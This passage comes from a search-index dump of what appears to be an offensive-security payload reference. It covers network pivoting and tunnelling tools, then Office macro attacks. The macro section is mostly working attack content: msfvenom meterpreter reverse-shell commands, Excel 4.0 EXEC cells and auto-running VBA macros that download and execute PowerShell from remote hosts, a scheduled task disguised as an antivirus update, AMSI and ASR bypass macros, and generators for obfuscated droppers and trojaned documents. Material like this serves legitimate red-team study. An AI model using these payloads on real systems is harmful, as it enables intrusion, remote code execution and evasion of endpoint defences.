Forwarding"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#ssh","text":"","title":"SSH"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#socks-proxy","text":"ssh -D8080 [user]@[host] ssh -N -f -D 9000 [user]@[host] -f : ssh in background -N : do not execute a remote command Cool Tip : Konami SSH Port forwarding [ENTER] + [~C] -D 1090","title":"SOCKS Proxy"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#local-port-forwarding","text":"ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]","title":"Local Port Forwarding"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#remote-port-forwarding","text":"ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host] ssh -R 3389:10.1.1.224:3389 root@10.11.0.32","title":"Remote Port Forwarding"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#proxychains","text":"Config file : /etc/proxychains.conf [ProxyList] socks4 localhost 8080 Set the SOCKS4 proxy then proxychains nmap -sT 192.168.5.6","title":"Proxychains"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#graftcp","text":"A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy. :warning: Same as proxychains, with another mechanism to \"proxify\" which allow Go applications. # https://github.com/hmgle/graftcp # Create a SOCKS5, using Chisel or another tool and forward it through SSH (attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS (vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse (victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks # Run graftcp and specify the SOCKS5 (attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080 (attacker) $ graftcp ./nuclei -u http://172.16.1.24 Simple configuration file for graftcp # https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf ## Listen address (default \":2233\") listen = :2233 loglevel = 1 ## SOCKS5 address (default \"127.0.0.1:1080\") socks5 = 127.0.0.1:1080 # socks5_username = SOCKS5USERNAME # socks5_password = SOCKS5PASSWORD ## Set the mode for select a proxy (default \"auto\") select_proxy_mode = auto","title":"Graftcp"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#web-socks-regeorg","text":"reGeorg , the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. Drop one of the following files on the server: tunnel.ashx tunnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsp python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080 optional arguments: -h, --help show this help message and exit -l , --listen-on The default listening address -p , --listen-port The default listening port -r , --read-buff Local read buffer, max data to be sent per POST -u , --url The url containing the tunnel script -v , --verbose Verbose output[INFO|DEBUG]","title":"Web SOCKS - reGeorg"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#web-socks-pivotnacci","text":"pivotnacci , a tool to make socks connections through HTTP agents. pip3 install pivotnacci pivotnacci https://domain.com/agent.php --password \"s3cr3t\" pivotnacci https://domain.com/agent.php --polling-interval 2000","title":"Web SOCKS - pivotnacci"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#metasploit","text":"# Meterpreter list active port forwards portfwd list # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell portfwd add \u2013l 3389 \u2013p 3389 \u2013r target-host portfwd add -l 88 -p 88 -r 127.0.0.1 portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445 # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell portfwd delete \u2013l 3389 \u2013p 3389 \u2013r target-host # Meterpreter delete all port forwards portfwd flush or # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0 run autoroute -s 192.168.15.0/24 use auxiliary/server/socks_proxy set SRVPORT 9090 set VERSION 4a # or use auxiliary/server/socks4a # (deprecated) # Meterpreter list all active routes run autoroute -p route #Meterpreter view available networks the compromised host can access # Meterpreter add route for 192.168.14.0/24 via Session number. route add 192.168.14.0 255.255.255.0 3 # Meterpreter delete route for 192.168.14.0/24 via Session number. route delete 192.168.14.0 255.255.255.0 3 # Meterpreter delete all routes route flush","title":"Metasploit"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#empire","text":"(Empire) > socksproxyserver (Empire) > use module management/invoke_socksproxy (Empire) > set remoteHost 10.10.10.10 (Empire) > run","title":"Empire"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#sshuttle","text":"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling. pacman -Sy sshuttle apt-get install sshuttle sshuttle -vvr user@10.10.10.10 10.1.1.0/24 sshuttle -vvr username@pivot_host 10.2.2.0/24 # using a private key $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e \"ssh -i ~/.ssh/id_rsa\" # -x == exclude some network to not transmit over the tunnel # -x x.x.x.x.x/24","title":"sshuttle"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#chisel","text":"go get -v github.com/jpillora/chisel # forward port 389 and 88 to hacker computer user@hacker$ /opt/chisel/chisel server -p 8008 --reverse user@victim$ .\\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 # SOCKS user@victim$ .\\chisel.exe client YOUR_IP:8008 R:socks","title":"chisel"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#sharpchisel","text":"A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel user@hacker$ ./chisel server -p 8080 --key \"private\" --auth \"user:pass\" --reverse --proxy \"https://www.google.com\" ================================================================ server : run the Server Component of chisel -p 8080 : run server on port 8080 --key \"private\": use \"private\" string to seed the generation of a ECDSA public and private key pair --auth \"user:pass\" : Creds required to connect to the server --reverse: Allow clients to specify reverse port forwarding remotes in addition to normal remotes. --proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight. user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks","title":"SharpChisel"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#ligolo","text":"Ligolo : Reverse Tunneling made easy for pentesters, by pentesters Build Ligolo ``powershell # Get Ligolo and dependencies cd go env GOPATH`/src git clone https://github.com/sysdream/ligolo cd ligolo make dep # Generate self-signed TLS certificates (will be placed in the certs folder) make certs TLS_HOST=example.com make build-all 2. Use Ligolo powershell # On your attack server. ./bin/localrelay_linux_amd64 # On the compromise host. ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555 ```","title":"Ligolo"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#gost","text":"Wiki English : https://docs.ginuerzh.xyz/gost/en/ git clone https://github.com/ginuerzh/gost cd gost/cmd/gost go build # Socks5 Proxy Server side: gost -L=socks5://:1080 Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true # Local Port Forward gost -L=tcp://:2222/192.168.1.1:22 [-F=..]","title":"Gost"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#rpivot","text":"Server (Attacker box) python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0 Client (Compromised box) python client.py --server-ip <ip> --server-port 9443 Through corporate proxy python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\ --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e Passing the hash python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\ --ntlm-proxy-port 8080 --domain CORP --username jdoe \\ --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE","title":"Rpivot"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#revsocks","text":"# Listen on the server and create a SOCKS 5 proxy on port 1080 user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234 # Connect client to the server user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent \"Mozilla 5.0/IE Windows 10\" # Build for Linux git clone https://github.com/kost/revsocks export GOPATH=~/go go get github.com/hashicorp/yamux go get github.com/armon/go-socks5 go get github.com/kost/go-ntlmssp go build go build -ldflags=\"-s -w\" && upx --brute revsocks # Build for Windows go get github.com/hashicorp/yamux go get github.com/armon/go-socks5 go get github.com/kost/go-ntlmssp GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" go build -ldflags -H=windowsgui upx revsocks","title":"revsocks"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#plink","text":"# exposes the SMB port of the machine in the port 445 of the SSH Server plink -l root -pw toor -R 445:127.0.0.1:445 # exposes the RDP port of the machine in the port 3390 of the SSH Server plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389 plink -l root -pw mypassword 192.168.18.84 -R plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP] # redirects the Windows port 445 to Kali on port 22 plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185","title":"plink"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#ngrok","text":"# get the binary wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip unzip ngrok-stable-linux-amd64.zip # log into the service ./ngrok authtoken 3U[REDACTED_TOKEN]Hm # deploy a port forwarding for 4433 ./ngrok http 4433 ./ngrok tcp 4433","title":"ngrok"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#cloudflared","text":"# Get the binary wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz tar xvzf cloudflared-stable-linux-amd64.tgz # Expose accessible internal service to the internet ./cloudflared tunnel --url <protocol>://<host>:<port>","title":"cloudflared"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#capture-a-network-trace-with-builtin-tools","text":"Windows (netsh) ```ps1 # start a capture use the netsh command. netsh trace start capture=yes report=disabled tracefile=c:\\trace.etl maxsize=16384 # stop the trace netsh trace stop # Event tracing can be also used across a reboots netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\\trace.etl maxsize=16384 # To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version. etl2pcapng.exe c:\\trace.etl c:\\trace.pcapng # Use filters netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\\trace.etl maxsize=16384 * Linux (tcpdump) ps1 sudo apt-get install tcpdump tcpdump -w 0001.pcap -i eth0 tcpdump -A -i eth0 # capture every TCP packet tcpdump -i eth0 tcp # capture everything on port 22 tcpdump -i eth0 port 22 ```","title":"Capture a network trace with builtin tools"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#basic-pivoting-types","text":"Type Use Case Listen - Listen Exposed asset, may not want to connect out. Listen - Connect Normal redirect. Connect - Connect Can\u2019t bind, so connect to bridge two hosts","title":"Basic Pivoting Types"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#listen-listen","text":"Type Use Case ncat ncat -v -l -p 8080 -c \"ncat -v -l -p 9090\" socat socat -v tcp-listen:8080 tcp-listen:9090 remote host 1 ncat localhost 8080 < file remote host 2 ncat localhost 9090 > newfile","title":"Listen - Listen"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#listen-connect","text":"Type Use Case ncat ncat -l -v -p 8080 -c \"ncat localhost 9090\" socat socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090 remote host 1 ncat localhost -p 8080 < file remote host 2 ncat -l -p 9090 > newfile","title":"Listen - Connect"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#connect-connect","text":"Type Use Case ncat ncat localhost 8080 -c \"ncat localhost 9090\" socat socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090 remote host 1 ncat -l -p 8080 < file remote host 2 ncat -l -p 9090 > newfile","title":"Connect - Connect"},{"location":"Methodology%20and%20Resources/Network%20Pivoting%20Techniques/#references","text":"Port Forwarding in Windows - Windows OS Hub Using the SSH \"Konami Code\" (SSH Control Sequences) - Jeff McJunkin A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko Pivoting Meterpreter \ud83c\uddeb\ud83c\uddf7 Etat de l\u2019art du pivoting r\u00e9seau en 2019 - Oct 28,2019 - Alexandre ZANNI - \ud83c\uddfa\ud83c\uddf8 Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8 Active Directory - hideandsec Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert","title":"References"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/","text":"Office - Attacks Summary XLSM - Hot Manchego XLS - Macrome XLM Excel 4.0 - SharpShooter XLM Excel 4.0 - EXCELntDonut XLM Excel 4.0 - EXEC DOCM - Metasploit DOCM - Download and Execute DOCM - Macro Creator DOCM - C# converted to Office VBA macro DOCM - VBA Wscript DOCM - VBA Shell Execute Comment DOCM - VBA Spawning via svchost.exe using Scheduled Task DCOM - WMI COM functions (VBA AMSI) DOCM - winmgmts DOCM - Macro Pack - Macro and DDE DOCM - BadAssMacros DOCM - CACTUSTORCH VBA Module DOCM - MMG with Custom DL + Exec VBA Obfuscation VBA Purging OfficePurge EvilClippy VBA AMSI VBA - Offensive Security Template DOCX - Template Injection DOCX - DDE References XLSM - Hot Manchego When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine. https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS> New-Item blank.xlsm PS> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs PS> .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt XLM - Macrome XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros. https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip # NOTE: The payload cannot contains NULL bytes. # Default calc msfvenom -a x86 -b '\\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin msfvenom -a x64 -b '\\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin # Custom shellcode msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\\x00' msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\\x00' # MSF shellcode msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin # For VBA Macro Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003. XLM Excel 4.0 - SharpShooter https://github.com/mdsecactivebreach/SharpShooter # Options -rawscfile <path> Path to raw shellcode file for stageless payloads --scfile <path> Path to shellcode file as CSharp byte array python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test # Creation of a VBA Macro # creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet. SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl # Creation of an Excel 4.0 SLK Macro Enabled Document ~# /!\\ The shellcode cannot contain null bytes msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\\x00' SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\\x00' SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee XLM Excel 4.0 - EXCELntDonut XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files. AMSI has no visibility into XLM macros (for now) Anti-virus struggles with XLM (for now) XLM macros can access the Win32 API (virtualalloc, createthread, ...) Open an Excel Workbook. Right click on \"Sheet 1\" and click \"Insert...\". Select \"MS Excel 4.0 Macro\". Open your EXCELntDonut output file in a text editor and copy everything. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet. At this point, everything is in column A. To fix that, we'll use the \"Text-to-Columns\"/\"Convert\" tool under the \"Data\" tab. Highlight column A and open the \"Text-to-Columns\" tool. Select \"Delimited\" and then \"Semicolon\" on the next screen. Select \"Finished\". Right-click on cell A1* and select \"Run\". This will execute your payload to make sure it works. To enable auto-execution, we need to rename cell A1 to \"Auto_Open\". You can do this by clicking into cell A1 and then clicking into the box that says \"A1\" just above Column A. Change the text from \"A1\"* to \"Auto_Open\". Save the file and verify that auto-execution works. :warning: If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1 git clone https://github.com/FortyNorthSecurity/EXCELntDonut -f path to file containing your C# source code (exe or dll) -c ClassName where method that you want to call lives (dll) -m Method containing your executable payload (dll) -r References needed to compile your C# code (ex: -r 'System.Management') -o output filename --sandbox Perform basic sandbox checks. --obfuscate Perform basic macro obfuscation. # Fork git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate] python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md XLM Excel 4.0 - EXEC Right Click to the current sheet Insert a Macro IntL MS Excel 4.0 Add the EXEC macro powershell =EXEC(\"poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')\") =halt() Rename cell to Auto_open Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide DOCM - Metasploit use exploit/multi/fileformat/office_word_macro set payload windows/meterpreter/reverse_http set LHOST 10.10.10.10 set LPORT 80 set DisablePayloadHandler True set PrependMigrate True set FILENAME Financial2021.docm exploit -j DOCM - Download and Execute Detected by Defender (AMSI) Sub Execute() Dim payload payload = \"powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');\" Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub DOCM - Macro Creator https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion: C:\\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body # Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion: C:\\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion: C:\\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e DOCM - C# converted to Office VBA macro A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted. https://github.com/trustedsec/unicorn python unicorn.py payload.cs cs macro DOCM - VBA Wscript https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office Sub parent_change() Dim objOL Set objOL = CreateObject(\"Outlook.Application\") Set shellObj = objOL.CreateObject(\"Wscript.Shell\") shellObj.Run(\"notepad.exe\") End Sub Sub AutoOpen() parent_change End Sub Sub Auto_Open() parent_change End Sub CreateObject(\"WScript.Shell\").Run \"calc.exe\" CreateObject(\"WScript.Shell\").Exec \"notepad.exe\" DOCM - VBA Shell Execute Comment Set your command payload inside the Comment metadata of the document. Sub beautifulcomment() Dim p As DocumentProperty For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = \"Comments\" Then Shell (p.Value) End If Next End Sub Sub AutoExec() beautifulcomment End Sub Sub AutoOpen() beautifulcomment End Sub DOCM - VBA Spawning via svchost.exe using Scheduled Task Sub AutoOpen() Set service = CreateObject(\"Schedule.Service\") Call service.Connect Dim td: Set td = service.NewTask(0) td.RegistrationInfo.Author = \"Kaspersky Corporation\" td.settings.StartWhenAvailable = True td.settings.Hidden = False Dim triggers: Set triggers = td.triggers Dim trigger: Set trigger = triggers.Create(1) Dim startTime: ts = DateAdd(\"s\", 30, Now) startTime = Year(ts) & \"-\" & Right(Month(ts), 2) & \"-\" & Right(Day(ts), 2) & \"T\" & Right(Hour(ts), 2) & \":\" & Right(Minute(ts), 2) & \":\" & Right(Second(ts), 2) trigger.StartBoundary = startTime trigger.ID = \"TimeTriggerId\" Dim Action: Set Action = td.Actions.Create(0) Action.Path = \"C:\\Windows\\System32\\powershell.exe\" Action.Arguments = \"-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\" Call service.GetFolder(\"\\\").RegisterTaskDefinition(\"AVUpdateTask\", td, 6, , , 3) End Sub Rem powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\" DOCM - WMI COM functions Basic WMI exec (detected by Defender) : r = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").Create(\"calc.exe\", null, null, intProcessID) Sub wmi_exec() strComputer = \".\" Set objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\") Set objStartUp = objWMIService.Get(\"Win32_ProcessStartup\") Set objProc = objWMIService.Get(\"Win32_Process\") Set procStartConfig = objStartUp.SpawnInstance_ procStartConfig.ShowWindow = 1 objProc.Create \"powershell.exe\", Null, procStartConfig, intProcessID End Sub https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3 https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2 Sub ASR_bypass_create_child_process_rule5() Const HIDDEN_WINDOW = 0 strComputer = \".\" Set objWMIService = GetObject(\"win\" & \"mgmts\" & \":\\\\\" & strComputer & \"\\root\" & \"\\cimv2\") Set objStartup = objWMIService.Get(\"Win32_\" & \"Process\" & \"Startup\") Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\" & \"\\cimv2\" & \":Win32_\" & \"Process\") objProcess.Create \"cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')\", Null, objConfig, intProcessID End Sub Sub AutoExec() ASR_bypass_create_child_process_rule5 End Sub Sub AutoOpen() ASR_bypass_create_child_process_rule5 End Sub Const ShellWindows = \"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\" Set SW = GetObject(\"new:\" & ShellWindows).Item() SW.Document.Application.ShellExecute \"cmd.exe\", \"/c powershell.exe\", \"C:\\Windows\\System32\", Null, 0 DOCM/XLM - Macro Pack - Macro and DDE Only the community version is available online. https://github.com/sevagas/macro_pack # Options -G, --generate=OUTPUT_FILE_PATH. Generates a file. -t, --template=TEMPLATE_NAME Use code template already included in MacroPack -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name) # Execute a command echo \"calc.exe\" | macro_pack.exe -t CMD -G cmd.xsl # Download and execute a file echo <file_to_drop_url> \"<download_path>\" | macro_pack.exe -t DROPPER -o -G dropper.xls # Meterpreter reverse TCP template using MacroMeter by Cn33liz echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm # Drop and execute embedded file macro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs # Obfuscate the vba file generated by msfvenom and put result in a new vba file. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba # Obfuscate Empire stager vba file and generate a MS Word document: macro_pack.exe -f empire.vba -o -G myDoc.docm # Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe) echo \"https://myurl.url/payload.exe\" \"dropped.exe\" | macro_pack.exe -o -t DROPPER -G \"drop.xlsm\" # Execute calc.exe via Dynamic Data Exchange (DDE) attack echo calc.exe | macro_pack.exe --dde -G calc.xslx # Download and execute file via powershell using Dynamic Data Exchange (DDE) attack macro_pack.exe --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl # PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --keep-alive -G out.docm # PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --trojan -G hotpics.pptm # PRO: Generate an HTA payload able to run a shellcode via Excel injection echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE --run-in-excel -o -G samples\\nicepic.hta echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\\my_shortcut.lnk # PRO: XLM Injection echo \"MPPro\" | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm --run-in-excel # PRO: ShellCode Exec - Heap Injection, AlternativeInjection echo \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc echo \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc # PRO: More shellcodes echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm \u2013keep-alive echo \"x86.bin\" \"x64.bin\" | macro_pack.exe -t AUTOSHELLCODE -o \u2013autopack -G sc_auto.doc echo \"http://192.168.5.10:8080/x32calc.bin\" \"http://192.168.5.10:8080/x64calc.bin\" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\\sc_dl.xls DOCM - BadAssMacros C# based automated Malicous Macro Generator. https://github.com/Inf0secRabbit/BadAssMacros BadAssMacros.exe -h # Create VBA for classic shellcode injection from raw shellcode BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file> BadAssMacros.exe -i .\\Desktop\\payload.bin -w doc -p no -s classic -c 23 -o .\\Desktop\\output.txt # Create VBA for indirect shellcode injection from raw shellcode BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file> # List modules inside Doc/Excel file BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l # Purge Doc/Excel file BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name> DOCM - CACTUSTORCH VBA Module CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript https://github.com/mdsecactivebreach/CACTUSTORCH https://github.com/tyranid/DotNetToJScript/ CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY CACTUSTORCH - 